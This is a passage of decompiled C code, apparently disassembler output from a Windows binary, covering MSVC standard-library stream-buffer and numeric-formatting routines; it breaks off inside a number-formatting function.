//----- (0040EEE0) --------------------------------------------------------
int __thiscall sub_40EEE0(int this, int a2)
{
  int v3; // eax
  int result; // eax
  unsigned int v5; // edx
  unsigned int v6; // edi
  unsigned int v7; // ecx
  unsigned int v8; // edi
  int *v9; // edx
  int v10; // ecx
  _DWORD *v11; // edx
  _BYTE *v12; // esi
  size_t v13; // edi
  unsigned int v14; // ecx
  _BYTE *v15; // eax
  _BYTE *v16; // ebx
  _DWORD *v17; // eax
  bool v18; // zf
  _DWORD *v19; // eax
  char *v20; // edx
  char *v21; // ecx
  int v22; // edx
  _DWORD *v23; // eax
  _DWORD *v24; // ecx
  _BYTE *v25; // edx
  unsigned int v26; // [esp+4h] [ebp-8h]
  _DWORD *Block; // [esp+8h] [ebp-4h]

  v3 = *(_DWORD *)(this + 60);
  if ( (v3 & 2) != 0 )
    return -1;
  if ( a2 == -1 )
    return 0;
  if ( (v3 & 8) != 0 )
  {
    v5 = **(_DWORD **)(this + 32);
    if ( v5 )
    {
      v6 = *(_DWORD *)(this + 56);
      if ( v5 < v6 )
      {
        v7 = v5 + **(_DWORD **)(this + 48) - v6;
        **(_DWORD **)(this + 32) = v6;
        **(_DWORD **)(this + 48) = v7;
      }
    }
  }
  v8 = **(_DWORD **)(this + 32);
  if ( v8 )
  {
    v9 = *(int **)(this + 48);
    v10 = *v9;
    if ( v8 < v8 + *v9 )
    {
      result = a2;
      *v9 = v10 - 1;
      v11 = *(_DWORD **)(this + 32);
      v12 = (_BYTE *)(*v11)++;
      *v12 = a2;
      return result;
    }
    v13 = v10 + v8 - **(_DWORD **)(this + 12);
  }
  else
  {
    v13 = 0;
  }
  v14 = v13 >> 1;
  if ( v13 >> 1 >= 0x20 )
  {
    if ( !v14 )
      return -1;
  }
  else
  {
    v14 = 32;
  }
  do
  {
    if ( 0x7FFFFFFF - v14 >= v13 )
      break;
    v14 >>= 1;
  }
  while ( v14 );
  if ( !v14 )
    return -1;
  v26 = v14 + v13;
  v15 = sub_401C70(v14 + v13);
  v16 = v15;
  Block = **(_DWORD ***)(this + 12);
  if ( v13 )
  {
    memmove_0(v15, **(const void ***)(this + 12), v13);
    *(_DWORD *)(this + 56) += v16 - (_BYTE *)Block;
    v20 = &v16[**(_DWORD **)(this + 32) - (_DWORD)Block];
    **(_DWORD **)(this + 16) += v16 - (_BYTE *)Block;
    **(_DWORD **)(this + 32) = v20;
    **(_DWORD **)(this + 48) = v26 + v16 - v20;
    if ( (*(_BYTE *)(this + 60) & 4) != 0 )
    {
      **(_DWORD **)(this + 12) = v16;
      **(_DWORD **)(this + 28) = 0;
      **(_DWORD **)(this + 44) = v16;
    }
    else
    {
      v21 = &v16[**(_DWORD **)(this + 28) - (_DWORD)Block];
      v22 = **(_DWORD **)(this + 32) - (_DWORD)v21;
      **(_DWORD **)(this + 12) = v16;
      **(_DWORD **)(this + 28) = v21;
      **(_DWORD **)(this + 44) = v22 + 1;
    }
  }
  else
  {
    v17 = *(_DWORD **)(this + 16);
    *(_DWORD *)(this + 56) = v16;
    *v17 = v16;
    **(_DWORD **)(this + 32) = v16;
    **(_DWORD **)(this + 48) = v26;
    v18 = (*(_BYTE *)(this + 60) & 4) == 0;
    **(_DWORD **)(this + 12) = v16;
    v19 = *(_DWORD **)(this + 28);
    if ( v18 )
    {
      *v19 = v16;
      **(_DWORD **)(this + 44) = 1;
    }
    else
    {
      *v19 = 0;
      **(_DWORD **)(this + 44) = v16;
    }
  }
  if ( (*(_BYTE *)(this + 60) & 1) != 0 )
    sub_401CD0(Block, v13);
  v23 = *(_DWORD **)(this + 48);
  *(_DWORD *)(this + 60) |= 1u;
  --*v23;
  v24 = *(_DWORD **)(this + 32);
  v25 = (_BYTE *)(*v24)++;
  result = a2;
  *v25 = a2;
  return result;
}
// 40EFCF: conditional instruction was optimized away because edi.4!=0

//----- (0040F0B0) --------------------------------------------------------
void __thiscall sub_40F0B0(_BYTE *this)
{
  bool v2; // zf
  int v3; // ecx
  int v4; // edx
  char *v5; // eax
  char *v6; // ecx
  unsigned int v7; // eax
  _DWORD *v8; // esi
  int v9; // ecx
  void (__thiscall ***v10)(_DWORD, int); // eax

  v2 = (this[60] & 1) == 0;
  *(_DWORD *)this = &std::stringbuf::`vftable';
  if ( !v2 )
  {
    v3 = **((_DWORD **)this + 8);
    if ( v3 )
      v4 = v3 + **((_DWORD **)this + 12);
    else
      v4 = **((_DWORD **)this + 7) + **((_DWORD **)this + 11);
    v5 = (char *)**((_DWORD **)this + 3);
    if ( (unsigned int)(v4 - (_DWORD)v5) >= 0x1000 )
    {
      if ( ((unsigned __int8)v5 & 0x1F) != 0
        || (v6 = (char *)*((_DWORD *)v5 - 1), v6 >= v5)
        || (v7 = v5 - v6, v7 < 4)
        || v7 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v5 = v6;
    }
    j__free(v5);
  }
  **((_DWORD **)this + 3) = 0;
  **((_DWORD **)this + 7) = 0;
  **((_DWORD **)this + 11) = 0;
  **((_DWORD **)this + 4) = 0;
  **((_DWORD **)this + 8) = 0;
  **((_DWORD **)this + 12) = 0;
  *((_DWORD *)this + 15) &= ~1u;
  *((_DWORD *)this + 14) = 0;
  *(_DWORD *)this = &std::streambuf::`vftable';
  v8 = (_DWORD *)*((_DWORD *)this + 13);
  if ( v8 )
  {
    v9 = v8[1];
    if ( v9 )
    {
      v10 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v9 + 8))(v9);
      if ( v10 )
        (**v10)(v10, 1);
    }
    sub_414AF8(v8);
  }
}
// 435FE8: using guessed type void *std::streambuf::`vftable';
// 442378: using guessed type void *std::stringbuf::`vftable';

//----- (0040F1D0) --------------------------------------------------------
char *__thiscall sub_40F1D0(char *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  char *v7; // ecx
  int v8; // ecx
  int v9; // eax
  int v10; // ebx
  unsigned int v11; // ecx
  _DWORD *v12; // edi
  int v13; // eax
  char *v14; // eax
  void (__thiscall ***v15)(_DWORD, int); // eax
  int v16; // eax
  int v17; // edx
  char *v18; // ecx
  int v19; // edx
  char v20; // al
  int v21; // ecx
  int v23; // [esp+0h] [ebp-8Ch] BYREF
  char v24[52]; // [esp+10h] [ebp-7Ch] BYREF
  int v25; // [esp+48h] [ebp-44h]
  char *v26; // [esp+4Ch] [ebp-40h]
  bool v27; // [esp+50h] [ebp-3Ch]
  int v28; // [esp+54h] [ebp-38h]
  char v29[4]; // [esp+58h] [ebp-34h] BYREF
  int v30; // [esp+5Ch] [ebp-30h]
  char *v31; // [esp+60h] [ebp-2Ch]
  void *Block; // [esp+64h] [ebp-28h]
  char v33[4]; // [esp+68h] [ebp-24h] BYREF
  int v34; // [esp+6Ch] [ebp-20h]
  int v35[4]; // [esp+70h] [ebp-1Ch] BYREF
  int v36; // [esp+88h] [ebp-4h]

  v35[3] = (int)&v23;
  v3 = 0;
  v30 = a2;
  v4 = *(_DWORD *)this;
  v31 = this;
  v28 = 0;
  v26 = this;
  v5 = *(_DWORD *)&this[*(_DWORD *)(v4 + 4) + 56];
  if ( v5 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  v36 = 0;
  v6 = *(_DWORD *)(*(_DWORD *)this + 4);
  if ( !*(_DWORD *)&this[v6 + 12] )
  {
    v7 = *(char **)&this[v6 + 60];
    if ( v7 )
    {
      if ( v7 != this )
        sub_40BE10(v7);
    }
  }
  v8 = *(_DWORD *)(*(_DWORD *)this + 4);
  v27 = *(_DWORD *)&this[v8 + 12] == 0;
  v36 = 1;
  if ( v27 )
  {
    v9 = *(_DWORD *)&this[v8 + 48];
    LOBYTE(v36) = 2;
    v25 = *(_DWORD *)(v9 + 4);
    v10 = v25;
    (*(void (__thiscall **)(int))(*(_DWORD *)v10 + 4))(v10);
    LOBYTE(v36) = 3;
    std::_Lockit::_Lockit((std::_Lockit *)v33, 0);
    LOBYTE(v36) = 4;
    v11 = dword_453868;
    Block = (void *)dword_453820;
    v35[0] = dword_453868;
    if ( !dword_453868 )
    {
      std::_Lockit::_Lockit((std::_Lockit *)v35, 0);
      if ( !dword_453868 )
        dword_453868 = ++dword_452924;
      std::_Lockit::~_Lockit((std::_Lockit *)v35);
      v11 = dword_453868;
      v35[0] = dword_453868;
    }
    if ( v11 >= *(_DWORD *)(v10 + 12) )
    {
      v12 = 0;
    }
    else
    {
      v12 = *(_DWORD **)(*(_DWORD *)(v10 + 8) + 4 * v11);
      if ( v12 )
        goto LABEL_25;
    }
    if ( *(_BYTE *)(v10 + 20) )
    {
      v13 = sub_413763();
      if ( v35[0] >= *(_DWORD *)(v13 + 12) )
        goto LABEL_20;
      v12 = *(_DWORD **)(*(_DWORD *)(v13 + 8) + 4 * v35[0]);
    }
    if ( !v12 )
    {
LABEL_20:
      if ( Block )
      {
        v12 = Block;
      }
      else
      {
        v12 = operator new(8u);
        Block = v12;
        LOBYTE(v36) = 5;
        v14 = *(char **)(v10 + 24);
        if ( !v14 )
          v14 = (char *)(v10 + 28);
        sub_403B20((struct std::_Locinfo *)v24, v14);
        v12[1] = 0;
        *v12 = &std::num_put<char,std::ostreambuf_iterator<char>>::`vftable';
        LOBYTE(v36) = 4;
        sub_403BE0((std::_Lockit *)v24);
        dword_453820 = (int)v12;
        (*(void (__thiscall **)(_DWORD *))(*v12 + 4))(v12);
        std::_Facet_Register((struct std::_Facet_base *)v12);
      }
    }
LABEL_25:
    std::_Lockit::~_Lockit((std::_Lockit *)v33);
    LOBYTE(v36) = 6;
    v15 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
    if ( v15 )
      (**v15)(v15, 1);
    LOBYTE(v36) = 7;
    v16 = *(_DWORD *)this;
    LOBYTE(v34) = 0;
    v17 = *(_DWORD *)(v16 + 4);
    LOBYTE(Block) = this[v17 + 64];
    (*(void (__thiscall **)(_DWORD *, char *, int, _DWORD, char *, void *, int))(*v12 + 36))(
      v12,
      v29,
      v34,
      *(_DWORD *)&this[v17 + 56],
      &this[v17],
      Block,
      v30);
    v3 = 0;
    if ( v29[0] )
      v3 = 4;
    v36 = 1;
  }
  v18 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
  if ( v3 )
  {
    v19 = v3 | *((_DWORD *)v18 + 3);
    v20 = v19 | 4;
    if ( *((_DWORD *)v18 + 14) )
      v20 = v19;
    sub_4043E0(v18, v20, 0);
  }
  v36 = 9;
  if ( !(unsigned __int8)j____uncaught_exception(v18) )
    sub_40BEE0(this);
  LOBYTE(v36) = 10;
  v21 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
  if ( v21 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v21 + 8))(v21);
  return this;
}
// 40F427: variable 'v18' is possibly undefined
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);
// 436440: using guessed type void *std::num_put<char,std::ostreambuf_iterator<char>>::`vftable';
// 452924: using guessed type int dword_452924;
// 453820: using guessed type int dword_453820;
// 40F1D0: using guessed type char var_24[4];
// 40F1D0: using guessed type char var_34[4];

//----- (0040F470) --------------------------------------------------------
char *__thiscall sub_40F470(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 104;
  sub_40EA50(this - 104);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v2);
  return v2;
}

//----- (0040F4A0) --------------------------------------------------------
_BYTE *__thiscall sub_40F4A0(_BYTE *Block, char a2)
{
  sub_40F0B0(Block);
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}

//----- (0040F4D0) --------------------------------------------------------
_DWORD *__thiscall sub_40F4D0(
        void *this,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        int a5,
        unsigned __int8 a6,
        const void *ArgList)
{
  int v8; // eax
  char Buffer[68]; // [esp+10h] [ebp-48h] BYREF

  v8 = sub_4039C0(Buffer, 0x40u, "%p", ArgList);
  sub_40FEB0((int)this, a2, a3, a4, a5, a6, Buffer, v8);
  return a2;
}

//----- (0040F540) --------------------------------------------------------
_DWORD *__thiscall sub_40F540(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double X)
{
  size_t v7; // edx
  unsigned int v8; // edi
  int v9; // esi
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  unsigned int v13; // ecx
  void **v14; // eax
  char *v15; // edi
  size_t v16; // esi
  char *v17; // eax
  int v18; // eax
  char *v19; // ecx
  void *v20; // ecx
  void *v21; // eax
  int ArgList; // [esp+24h] [ebp-3Ch]
  int Y; // [esp+2Ch] [ebp-34h] BYREF
  void *Block[4]; // [esp+30h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+40h] [ebp-20h]
  unsigned int v28; // [esp+44h] [ebp-1Ch]
  char v29[8]; // [esp+48h] [ebp-18h] BYREF
  int v30; // [esp+5Ch] [ebp-4h]

  v7 = 0;
  v8 = 15;
  BufferCount = 0;
  v28 = 15;
  LOBYTE(Block[0]) = 0;
  v30 = 0;
  v9 = *(_DWORD *)(a5 + 24);
  v10 = *(_DWORD *)(a5 + 20) & 0x3000;
  v11 = *(_DWORD *)(a5 + 28);
  ArgList = v9;
  if ( __SPAIR64__(v11, v9) <= 0 && v10 != 0x2000 )
  {
    v9 = 6;
    v11 = 0;
    ArgList = 6;
  }
  Y = v11;
  v12 = v9;
  if ( v10 == 0x2000 && fabs(X) > 1.0e10 )
  {
    frexp(X, &Y);
    v8 = v28;
    v7 = BufferCount;
    v12 = v9 + (int)(30103 * abs32(Y)) / 100000;
  }
  v13 = __CFADD__(v12, 50) ? -1 : v12 + 50;
  if ( v13 > v7 )
  {
    sub_40B500((char **)Block, v13 - v7, 0);
  }
  else
  {
    BufferCount = __CFADD__(v12, 50) ? -1 : v12 + 50;
    v14 = Block;
    if ( v8 >= 0x10 )
      v14 = (void **)Block[0];
    *((_BYTE *)v14 + v13) = 0;
  }
  v15 = (char *)Block;
  if ( v28 >= 0x10 )
    v15 = (char *)Block[0];
  v16 = BufferCount;
  v17 = sub_4107E0((int)this, v29, 76, *(_DWORD *)(a5 + 20));
  v18 = sub_4039C0(v15, v16, v17, ArgList, X);
  v19 = (char *)Block;
  if ( v28 >= 0x10 )
    v19 = (char *)Block[0];
  sub_410360((int)this, a2, a3, a4, (__int64 *)a5, a6, v19, v18);
  if ( v28 >= 0x10 )
  {
    v20 = Block[0];
    if ( v28 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0
        || (v21 = (void *)*((_DWORD *)Block[0] - 1), v21 >= Block[0])
        || (unsigned int)(Block[0] - v21) < 4
        || (unsigned int)(Block[0] - v21) > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v20 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v20);
  }
  return a2;
}
// 40F540: using guessed type char var_18[8];

//----- (0040F710) --------------------------------------------------------
_DWORD *__thiscall sub_40F710(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double X)
{
  size_t v7; // edx
  unsigned int v8; // edi
  int v9; // esi
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  unsigned int v13; // ecx
  void **v14; // eax
  char *v15; // edi
  size_t v16; // esi
  char *v17; // eax
  int v18; // eax
  char *v19; // ecx
  void *v20; // ecx
  void *v21; // eax
  int ArgList; // [esp+24h] [ebp-3Ch]
  int Y; // [esp+2Ch] [ebp-34h] BYREF
  void *Block[4]; // [esp+30h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+40h] [ebp-20h]
  unsigned int v28; // [esp+44h] [ebp-1Ch]
  char v29[8]; // [esp+48h] [ebp-18h] BYREF
  int v30; // [esp+5Ch] [ebp-4h]

  v7 = 0;
  v8 = 15;
  BufferCount = 0;
  v28 = 15;
  LOBYTE(Block[0]) = 0;
  v30 = 0;
  v9 = *(_DWORD *)(a5 + 24);
  v10 = *(_DWORD *)(a5 + 20) & 0x3000;
  v11 = *(_DWORD *)(a5 + 28);
  ArgList = v9;
  if ( __SPAIR64__(v11, v9) <= 0 && v10 != 0x2000 )
  {
    v9 = 6;
    v11 = 0;
    ArgList = 6;
  }
  Y = v11;
  v12 = v9;
  if ( v10 == 0x2000 && fabs(X) > 1.0e10 )
  {
    frexp(X, &Y);
    v8 = v28;
    v7 = BufferCount;
    v12 = v9 + (int)(30103 * abs32(Y)) / 100000;
  }
  v13 = __CFADD__(v12, 50) ? -1 : v12 + 50;
  if ( v13 > v7 )
  {
    sub_40B500((char **)Block, v13 - v7, 0);
  }
  else
  {
    BufferCount = __CFADD__(v12, 50) ? -1 : v12 + 50;
    v14 = Block;
    if ( v8 >= 0x10 )
      v14 = (void **)Block[0];
    *((_BYTE *)v14 + v13) = 0;
  }
  v15 = (char *)Block;
  if ( v28 >= 0x10 )
    v15 = (char *)Block[0];
  v16 = BufferCount;
  v17 = sub_4107E0((int)this, v29, 0, *(_DWORD *)(a5 + 20));
  v18 = sub_4039C0(v15, v16, v17, ArgList, X);
  v19 = (char *)Block;
  if ( v28 >= 0x10 )
    v19 = (char *)Block[0];
  sub_410360((int)this, a2, a3, a4, (__int64 *)a5, a6, v19, v18);
  if ( v28 >= 0x10 )
  {
    v20 = Block[0];
    if ( v28 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0
        || (v21 = (void *)*((_DWORD *)Block[0] - 1), v21 >= Block[0])
        || (unsigned int)(Block[0] - v21) < 4
        || (unsigned int)(Block[0] - v21) > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v20 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v20);
  }
  return a2;
}
// 40F710: using guessed type char var_18[8];

//----- (0040F8E0) --------------------------------------------------------
_DWORD *__thiscall sub_40F8E0(
        void *this,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        int a5,
        unsigned __int8 a6,
        int ArgList,
        int a8)
{
  char *v9; // eax
  int v10; // eax
  char v12[8]; // [esp+10h] [ebp-50h] BYREF
  char Buffer[68]; // [esp+18h] [ebp-48h] BYREF

  v9 = sub_4102D0((int)this, v12, "Lu", *(_DWORD *)(a5 + 20));
  v10 = sub_4039C0(Buffer, 0x40u, v9, ArgList, a8);
  sub_40FEB0((int)this, a2, a3, a4, a5, a6, Buffer, v10);
  return a2;
}
// 40F8E0: using guessed type char var_50[8];
// 40F8E0: using guessed type _DWORD ArgList;

//----- (0040F960) --------------------------------------------------------
_DWORD *__thiscall sub_40F960(
        void *this,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        int a5,
        unsigned __int8 a6,
        int ArgList,
        int a8)
{
  char *v9; // eax
  int v10; // eax
  char v12[8]; // [esp+10h] [ebp-50h] BYREF
  char Buffer[68]; // [esp+18h] [ebp-48h] BYREF

  v9 = sub_4102D0((int)this, v12, "Ld", *(_DWORD *)(a5 + 20));
  v10 = sub_4039C0(Buffer, 0x40u, v9, ArgList, a8);
  sub_40FEB0((int)this, a2, a3, a4, a5, a6, Buffer, v10);
  return a2;
}
// 40F960: using guessed type char var_50[8];
// 40F960: using guessed type _DWORD ArgList;

//----- (0040F9E0) --------------------------------------------------------
_DWORD *__thiscall sub_40F9E0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, int ArgList)
{
  char *v8; // eax
  int v9; // eax
  char v11[8]; // [esp+10h] [ebp-50h] BYREF
  char Buffer[68]; // [esp+18h] [ebp-48h] BYREF

  v8 = sub_4102D0((int)this, v11, "lu", *(_DWORD *)(a5 + 20));
  v9 = sub_4039C0(Buffer, 0x40u, v8, ArgList);
  sub_40FEB0((int)this, a2, a3, a4, a5, a6, Buffer, v9);
  return a2;
}
// 40F9E0: using guessed type char var_50[8];

//----- (0040FA60) --------------------------------------------------------
_DWORD *__thiscall sub_40FA60(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, int ArgList)
{
  char *v8; // eax
  int v9; // eax
  char v11[8]; // [esp+10h] [ebp-50h] BYREF
  char Buffer[68]; // [esp+18h] [ebp-48h] BYREF

  v8 = sub_4102D0((int)this, v11, "ld", *(_DWORD *)(a5 + 20));
  v9 = sub_4039C0(Buffer, 0x40u, v8, ArgList);
  sub_40FEB0((int)this, a2, a3, a4, a5, a6, Buffer, v9);
  return a2;
}
// 40FA60: using guessed type char var_50[8];

//----- (0040FAE0) --------------------------------------------------------
_DWORD *__thiscall sub_40FAE0(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, char a6, unsigned __int8 a7)
{
  int v7; // eax
  int *v8; // edi
  void (__thiscall ***v9)(_DWORD, int); // eax
  int v10; // eax
  unsigned int v11; // edi
  int v12; // edi
  int *v13; // eax
  int v14; // ecx
  _DWORD *v15; // edx
  unsigned __int8 *v16; // eax
  int *v17; // eax
  void *v18; // ecx
  void *v19; // eax
  int v21; // [esp-30h] [ebp-98h]
  int v22; // [esp-28h] [ebp-90h]
  unsigned __int8 v23; // [esp-20h] [ebp-88h]
  int v24; // [esp+10h] [ebp-58h] BYREF
  char *v25[6]; // [esp+18h] [ebp-50h] BYREF
  int v26; // [esp+30h] [ebp-38h] BYREF
  int v27; // [esp+34h] [ebp-34h]
  int v28; // [esp+38h] [ebp-30h]
  int v29; // [esp+3Ch] [ebp-2Ch]
  void *Block[4]; // [esp+40h] [ebp-28h] BYREF
  unsigned int v31; // [esp+50h] [ebp-18h]
  unsigned int v32; // [esp+54h] [ebp-14h]
  int v33; // [esp+64h] [ebp-4h]
  _DWORD *v34; // [esp+78h] [ebp+10h]

  v28 = (int)this;
  LOBYTE(v29) = a6;
  if ( (*((_DWORD *)a5 + 5) & 0x4000) != 0 )
  {
    v7 = *((_DWORD *)a5 + 12);
    v33 = 0;
    v27 = *(_DWORD *)(v7 + 4);
    (*(void (**)(void))(*(_DWORD *)v27 + 4))();
    v33 = 1;
    v8 = (int *)sub_410C60((int)&v26);
    v33 = 2;
    if ( v27 )
    {
      v9 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v27 + 8))(v27);
      if ( v9 )
        (**v9)(v9, 1);
    }
    v31 = 0;
    v32 = 15;
    LOBYTE(Block[0]) = 0;
    v33 = 3;
    v10 = *v8;
    if ( a7 )
      (*(void (__thiscall **)(int *, char **))(v10 + 28))(v8, v25);
    else
      (*(void (__thiscall **)(int *, char **))(v10 + 24))(v8, v25);
    sub_403490((char **)Block, v25);
    sub_401970(v25);
    if ( a5[4] <= 0 || (v11 = *((_DWORD *)a5 + 8), v11 <= v31) )
      v12 = 0;
    else
      v12 = v11 - v31;
    if ( (*((_DWORD *)a5 + 5) & 0x1C0) == 64 )
    {
      v15 = a4;
      v14 = a3;
    }
    else
    {
      v13 = sub_40FDB0(v28, &v26, a3, a4, v29, v12);
      v12 = 0;
      v14 = *v13;
      v15 = (_DWORD *)v13[1];
    }
    v16 = (unsigned __int8 *)Block;
    if ( v32 >= 0x10 )
      v16 = (unsigned __int8 *)Block[0];
    v17 = sub_40FE30(v28, &v24, v14, v15, v16, v31);
    v23 = v29;
    v22 = *v17;
    v21 = v28;
    v34 = (_DWORD *)v17[1];
    a5[4] = 0i64;
    sub_40FDB0(v21, a2, v22, v34, v23, v12);
    if ( v32 >= 0x10 )
    {
      v18 = Block[0];
      if ( v32 + 1 >= 0x1000 )
      {
        if ( ((int)Block[0] & 0x1F) != 0
          || (v19 = (void *)*((_DWORD *)Block[0] - 1), v19 >= Block[0])
          || (unsigned int)(Block[0] - v19) < 4
          || (unsigned int)(Block[0] - v19) > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v18 = (void *)*((_DWORD *)Block[0] - 1);
      }
      j__free(v18);
    }
  }
  else
  {
    (*(void (__thiscall **)(void *, _DWORD *, int, _DWORD *, __int64 *, int, _DWORD))(*(_DWORD *)this + 36))(
      this,
      a2,
      a3,
      a4,
      a5,
      v29,
      a7);
  }
  return a2;
}

//----- (0040FCD0) --------------------------------------------------------
char **__thiscall sub_40FCD0(_DWORD *this, char **a2)
{
  void *v2; // edx

  v2 = (void *)this[5];
  a2[4] = 0;
  a2[5] = (char *)15;
  *(_BYTE *)a2 = 0;
  sub_401D10(a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (0040FD10) --------------------------------------------------------
char **__thiscall sub_40FD10(_DWORD *this, char **a2)
{
  void *v2; // edx

  v2 = (void *)this[4];
  a2[4] = 0;
  a2[5] = (char *)15;
  *(_BYTE *)a2 = 0;
  sub_401D10(a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (0040FD50) --------------------------------------------------------
char **__thiscall sub_40FD50(_DWORD *this, char **a2)
{
  void *v2; // edx

  v2 = (void *)this[2];
  a2[4] = 0;
  a2[5] = (char *)15;
  *(_BYTE *)a2 = 0;
  sub_401D10(a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (0040FD90) --------------------------------------------------------
char __thiscall sub_40FD90(_BYTE *this)
{
  return this[13];
}

//----- (0040FDA0) --------------------------------------------------------
char __thiscall sub_40FDA0(_BYTE *this)
{
  return this[12];
}

//----- (0040FDB0) --------------------------------------------------------
_DWORD *__cdecl sub_40FDB0(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 a5, int a6)
{
  _DWORD *result; // eax
  _DWORD *v7; // esi
  int v8; // edi
  int *v9; // ecx
  _DWORD *v10; // ecx
  _BYTE *v11; // edx
  int v12; // eax

  result = a2;
  v7 = a4;
  v8 = a6;
  if ( a6 )
  {
    do
    {
      if ( !v7 )
        goto LABEL_8;
      if ( *(_DWORD *)v7[8] && (v9 = (int *)v7[12], *v9 > 0) )
      {
        --*v9;
        v10 = (_DWORD *)v7[8];
        v11 = (_BYTE *)(*v10)++;
        *v11 = a5;
        v12 = a5;
      }
      else
      {
        v12 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v7 + 12))(v7, a5);
      }
      v7 = a4;
      if ( v12 == -1 )
LABEL_8:
        LOBYTE(a3) = 1;
      --v8;
    }
    while ( v8 );
    result = a2;
  }
  result[1] = v7;
  *result = a3;
  return result;
}

//----- (0040FE30) --------------------------------------------------------
_DWORD *__cdecl sub_40FE30(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int a6)
{
  _DWORD *result; // eax
  _DWORD *v8; // esi
  int v9; // edi
  int *v10; // edx
  _DWORD *v11; // ecx
  unsigned __int8 *v12; // edx
  int v13; // eax
  unsigned __int8 v14; // [esp+13h] [ebp-1h]

  result = a2;
  v8 = a4;
  v9 = a6;
  if ( a6 )
  {
    do
    {
      if ( !v8 )
        goto LABEL_8;
      v14 = *a5;
      if ( *(_DWORD *)v8[8] && (v10 = (int *)v8[12], *v10 > 0) )
      {
        --*v10;
        v11 = (_DWORD *)v8[8];
        v12 = (unsigned __int8 *)(*v11)++;
        *v12 = v14;
        v13 = v14;
      }
      else
      {
        v13 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v8 + 12))(v8, *a5);
      }
      v8 = a4;
      if ( v13 == -1 )
LABEL_8:
        LOBYTE(a3) = 1;
      ++a5;
      --v9;
    }
    while ( v9 );
    result = a2;
  }
  result[1] = v8;
  *result = a3;
  return result;
}

//----- (0040FEB0) --------------------------------------------------------
_DWORD *__cdecl sub_40FEB0(int a1, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, _BYTE *a7, size_t Size)
{
  size_t v8; // edi
  int v9; // esi
  int v10; // eax
  _DWORD *v11; // eax
  char v12; // cl
  int v13; // eax
  void (__thiscall ***v14)(_DWORD, int); // eax
  void **v15; // eax
  int v16; // eax
  void *v17; // ebx
  void (__thiscall ***v18)(_DWORD, int); // eax
  void **v19; // ebx
  char v20; // al
  bool v21; // zf
  unsigned int v22; // ecx
  unsigned int v23; // edx
  void **v24; // eax
  _BYTE *v25; // esi
  void **v26; // eax
  int v27; // ebx
  unsigned int v28; // edi
  int v29; // edi
  int v30; // eax
  int *v31; // ecx
  unsigned __int8 *v32; // eax
  int *v33; // eax
  unsigned __int8 *v34; // eax
  int *v35; // eax
  unsigned __int8 *v36; // eax
  int v37; // edx
  void **v38; // eax
  int *v39; // eax
  _DWORD *v40; // edi
  void *v41; // ecx
  void *v42; // eax
  void *v43; // ecx
  void *v44; // eax
  _DWORD *v46; // [esp-2Ch] [ebp-9Ch]
  int v47; // [esp-28h] [ebp-98h]
  int v48; // [esp-1Ch] [ebp-8Ch]
  int v49; // [esp+10h] [ebp-60h] BYREF
  int v50; // [esp+14h] [ebp-5Ch]
  _DWORD *v51; // [esp+18h] [ebp-58h]
  int v52; // [esp+1Ch] [ebp-54h] BYREF
  int v53; // [esp+20h] [ebp-50h]
  char v54[4]; // [esp+24h] [ebp-4Ch]
  int v55; // [esp+28h] [ebp-48h]
  _DWORD *v56; // [esp+2Ch] [ebp-44h]
  void *Block[5]; // [esp+30h] [ebp-40h] BYREF
  unsigned int v58; // [esp+44h] [ebp-2Ch]
  void *Src[4]; // [esp+48h] [ebp-28h] BYREF
  unsigned int v60; // [esp+58h] [ebp-18h]
  unsigned int v61; // [esp+5Ch] [ebp-14h]
  int v62; // [esp+6Ch] [ebp-4h]
  int savedregs; // [esp+70h] [ebp+0h] BYREF
  _DWORD *v64; // [esp+84h] [ebp+14h]

  v8 = Size;
  v51 = a2;
  v50 = a5;
  v55 = (int)a7;
  v9 = Size && (*a7 == 43 || *a7 == 45);
  v10 = *(_DWORD *)(a5 + 20) & 0xE00;
  v56 = (_DWORD *)v9;
  if ( v10 == 2048 )
  {
    v11 = (_DWORD *)(v9 + 2);
    if ( v9 + 2 <= Size && a7[v9] == 48 )
    {
      v12 = a7[v9 + 1];
